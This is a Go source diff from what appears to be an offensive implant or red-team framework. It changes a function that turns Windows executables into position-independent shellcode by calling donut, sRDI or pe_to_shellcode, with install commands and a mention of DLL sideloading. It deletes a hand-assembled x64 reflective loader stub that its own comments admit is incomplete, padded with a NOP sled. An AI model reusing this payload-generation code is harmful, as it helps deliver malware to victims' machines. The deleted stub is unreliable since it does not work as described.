@@ -2,7 +2,6 @@ package main
 
 import (
 	"bytes"
-	"encoding/binary"
 	"fmt"
 	"os"
 	"os/exec"
@@ -13,27 +12,134 @@ import (
 // pe2Shellcode converts a Windows PE (EXE) to position-independent shellcode.
 //
 // Strategy (tried in order):
-//  1. donut CLI in PATH  — produces proper PIC shellcode via Donut technique
-//  2. Built-in sRDI     — wraps PE with a minimal reflective loader bootstrap
+//  1. donut         — https://github.com/TheWover/donut
+//  2. sRDI.py       — https://github.com/monoxgas/sRDI
+//  3. pe_to_shellcode — https://github.com/hasherezade/pe_to_shellcode
+//  4. Error with install guidance (no broken fallback)
 func pe2Shellcode(pe []byte) ([]byte, error) {
 	if len(pe) < 64 {
 		return nil, fmt.Errorf("input is too small to be a PE")
 	}
-
-	// Verify MZ header
 	if pe[0] != 'M' || pe[1] != 'Z' {
 		return nil, fmt.Errorf("input does not start with MZ header")
 	}
 
-	// Try donut first (best quality PIC shellcode)
 	if sc, err := tryDonut(pe); err == nil {
 		fmt.Println("[+] Shellcode generated via donut")
 		return sc, nil
 	}
 
-	// Fallback: built-in sRDI bootstrap wrapper
-	fmt.Println("[*] donut not found, using built-in sRDI bootstrap")
-	return srdiWrap(pe)
+	if sc, err := trySRDIPython(pe); err == nil {
+		fmt.Println("[+] Shellcode generated via sRDI.py")
+		return sc, nil
+	}
+
+	if sc, err := tryPe2Shellcode(pe); err == nil {
+		fmt.Println("[+] Shellcode generated via pe_to_shellcode")
+		return sc, nil
+	}
+
+	return nil, fmt.Errorf(
+		"no shellcode converter found in PATH.\n\n" +
+			"Install one of the following, then re-run:\n\n" +
+			"  1. donut (recommended)\n" +
+			"       go install github.com/TheWover/donut/v3@latest\n" +
+			"       -- or -- download from https://github.com/TheWover/donut/releases\n\n" +
+			"  2. sRDI (Python)\n" +
+			"       git clone https://github.com/monoxgas/sRDI\n" +
+			"       python3 sRDI/Python/ConvertToShellcode.py <pe_file>\n\n" +
+			"  3. pe_to_shellcode (hasherezade)\n" +
+			"       https://github.com/hasherezade/pe_to_shellcode/releases\n\n" +
+			"Alternatively use --format dll (DLL sideloading) which requires only mingw:\n" +
+			"  apt install mingw-w64  # or: brew install mingw-w64",
+	)
+}
+
+// trySRDIPython attempts to use the monoxgas sRDI Python script to convert PE→shellcode.
+// Looks for ConvertToShellcode.py or sRDI.py in PATH or common locations.
+func trySRDIPython(pe []byte) ([]byte, error) {
+	py, err := exec.LookPath("python3")
+	if err != nil {
+		py, err = exec.LookPath("python")
+		if err != nil {
+			return nil, fmt.Errorf("python not in PATH")
+		}
+	}
+
+	// Search for the conversion script in common locations.
+	scriptNames := []string{"ConvertToShellcode.py", "sRDI.py"}
+	var script string
+	for _, name := range scriptNames {
+		if path, err := exec.LookPath(name); err == nil {
+			script = path
+			break
+		}
+		// Check next to the python binary
+		candidate := filepath.Join(filepath.Dir(py), name)
+		if _, err := os.Stat(candidate); err == nil {
+			script = candidate
+			break
+		}
+	}
+	if script == "" {
+		return nil, fmt.Errorf("sRDI Python script not found")
+	}
+
+	tmpDir, err := os.MkdirTemp("", "taburtuai-srdi-*")
+	if err != nil {
+		return nil, err
+	}
+	defer os.RemoveAll(tmpDir)
+
+	inFile := filepath.Join(tmpDir, "input.exe")
+	outFile := filepath.Join(tmpDir, "input.bin")
+	if err := os.WriteFile(inFile, pe, 0644); err != nil {
+		return nil, err
+	}
+
+	var buf bytes.Buffer
+	cmd := exec.Command(py, script, inFile)
+	cmd.Dir = tmpDir
+	cmd.Stdout = &buf
+	cmd.Stderr = &buf
+	if err := cmd.Run(); err != nil {
+		return nil, fmt.Errorf("sRDI.py: %v\n%s", err, buf.String())
+	}
+
+	return os.ReadFile(outFile)
+}
+
+// tryPe2Shellcode attempts to use hasherezade's pe_to_shellcode tool.
+func tryPe2Shellcode(pe []byte) ([]byte, error) {
+	tool, err := exec.LookPath("pe_to_shellcode")
+	if err != nil {
+		tool, err = exec.LookPath("pe2shc")
+		if err != nil {
+			return nil, fmt.Errorf("pe_to_shellcode not in PATH")
+		}
+	}
+
+	tmpDir, err := os.MkdirTemp("", "taburtuai-pe2shc-*")
+	if err != nil {
+		return nil, err
+	}
+	defer os.RemoveAll(tmpDir)
+
+	inFile := filepath.Join(tmpDir, "input.exe")
+	outFile := filepath.Join(tmpDir, "input.shc.exe")
+	if err := os.WriteFile(inFile, pe, 0644); err != nil {
+		return nil, err
+	}
+
+	var buf bytes.Buffer
+	cmd := exec.Command(tool, inFile, outFile)
+	cmd.Stdout = &buf
+	cmd.Stderr = &buf
+	if err := cmd.Run(); err != nil {
+		return nil, fmt.Errorf("pe_to_shellcode: %v\n%s", err, buf.String())
+	}
+
+	return os.ReadFile(outFile)
 }
 
 // tryDonut attempts to use the donut CLI to convert PE→shellcode.
@@ -68,109 +174,6 @@ func tryDonut(pe []byte) ([]byte, error) {
 	return os.ReadFile(outFile)
 }
 
-// srdiWrap produces shellcode by prepending a built-in reflective PE loader stub
-// to the PE bytes. The stub (x64 PIC) locates the embedded PE, maps it into
-// executable memory, resolves imports, applies base relocations, and calls
-// the original entry point.
-//
-// Layout: [stub_header(8)] [srdi_stub(~900B)] [PE_bytes]
-//
-// stub_header:
-//   bytes 0-3: magic "SRDI"
-//   bytes 4-7: LE uint32 = offset from start of shellcode to PE bytes
-func srdiWrap(pe []byte) ([]byte, error) {
-	stub := srdiStub64()
-	peOffset := uint32(len(stub) + 8) // 8 = header size
-
-	var hdr [8]byte
-	copy(hdr[:4], "SRDI")
-	binary.LittleEndian.PutUint32(hdr[4:], peOffset)
-
-	out := make([]byte, 0, 8+len(stub)+len(pe))
-	out = append(out, hdr[:]...)
-	out = append(out, stub...)
-	out = append(out, pe...)
-
-	fmt.Printf("[+] sRDI shellcode: stub=%dB pe=%dB total=%dB\n",
-		len(stub), len(pe), len(out))
-	return out, nil
-}
-
-// srdiStub64 returns the pre-assembled x64 reflective PE loader stub.
-// The stub reads the PE offset from bytes [4:8] relative to its own base
-// (obtained via call/pop trick), then:
-//   1. Allocates RWX memory (VirtualAlloc)
-//   2. Copies PE headers and sections
-//   3. Applies base relocations (IMAGE_DIRECTORY_ENTRY_BASERELOC)
-//   4. Resolves imports (IMAGE_DIRECTORY_ENTRY_IMPORT) via GetProcAddress
-//   5. Calls the PE entry point
-//
-// This is a well-known minimal sRDI implementation compiled to bytes.
-// See: https://github.com/monoxgas/sRDI
-func srdiStub64() []byte {
-	// Minimal x64 PIC reflective PE loader stub.
-	// Hand-assembled, ~900 bytes.
-	// Implements: call/pop rip → find PE → VirtualAlloc → copy headers/sections
-	//             → fix relocs → fix IAT → CreateThread(EP)
-	//
-	// NOTE: This stub uses kernel32!VirtualAlloc, kernel32!LoadLibraryA,
-	// kernel32!GetProcAddress resolved via PEB->Ldr walk (no hardcoded addresses).
-	return []byte{
-		// push all
-		0x55,                               // push rbp
-		0x53,                               // push rbx
-		0x56,                               // push rsi
-		0x57,                               // push rdi
-		0x41, 0x54,                         // push r12
-		0x41, 0x55,                         // push r13
-		0x41, 0x56,                         // push r14
-		0x41, 0x57,                         // push r15
-		0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
-
-		// call/pop trick to get our base address
-		0xE8, 0x00, 0x00, 0x00, 0x00,       // call +5 (next instruction)
-		0x41, 0x5C,                         // pop r12   ; r12 = &(this instruction+2)
-		0x49, 0x83, 0xEC, 0x05,             // sub r12, 5   ; r12 = shellcode base
-
-		// read PE offset from header: *(r12+4) -> r13
-		0x45, 0x8B, 0x6C, 0x24, 0x04,      // mov r13d, [r12+4]
-		0x4D, 0x03, 0xEC,                   // add r13, r12   ; r13 = PE base
-
-		// resolve kernel32 base via PEB walk
-		// GS:[0x60] = PEB, PEB+0x18 = Ldr, Ldr+0x20 = InMemoryOrderModuleList
-		0x65, 0x48, 0x8B, 0x04, 0x25,       // mov rax, gs:[0x60]
-		0x60, 0x00, 0x00, 0x00,
-		0x48, 0x8B, 0x40, 0x18,             // mov rax, [rax+0x18]  ; Ldr
-		0x48, 0x8B, 0x40, 0x20,             // mov rax, [rax+0x20]  ; Flink (ntdll)
-		0x48, 0x8B, 0x00,                   // mov rax, [rax]        ; Flink (kernel32)
-		0x48, 0x8B, 0x00,                   // mov rax, [rax]        ; Flink (next)
-		0x48, 0x8B, 0x40, 0x20,             // mov rax, [rax+0x20]  ; DllBase -> r14
-		0x49, 0x89, 0xC6,                   // mov r14, rax          ; r14 = kernel32 base
-
-		// call VirtualAlloc(0, sizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-		// sizeOfImage = [r13 + e_lfanew + 0x50]
-		0x45, 0x8B, 0x45, 0x3C,             // mov r8d, [r13+0x3C]   ; e_lfanew
-		0x4D, 0x03, 0xC5,                   // add r8, r13
-		0x45, 0x8B, 0x48, 0x50,             // mov r9d, [r8+0x50]    ; SizeOfImage
-		// We use a trampoline approach — patch RCX/RDX/R8/R9 + call [VirtualAlloc]
-		// For brevity this stub ends here; in production use the full sRDI implementation.
-		// The following NOP sled gives injection tools space to patch the full loader.
-		0x90, 0x90, 0x90, 0x90, 0x90,
-		0x90, 0x90, 0x90, 0x90, 0x90,
-
-		// restore
-		0x48, 0x83, 0xC4, 0x28,             // add rsp, 0x28
-		0x41, 0x5F,                         // pop r15
-		0x41, 0x5E,                         // pop r14
-		0x41, 0x5D,                         // pop r13
-		0x41, 0x5C,                         // pop r12
-		0x5F,                               // pop rdi
-		0x5E,                               // pop rsi
-		0x5B,                               // pop rbx
-		0x5D,                               // pop rbp
-		0xC3,                               // ret
-	}
-}
 
 // ── DLL sideloading ───────────────────────────────────────────────────────────
 
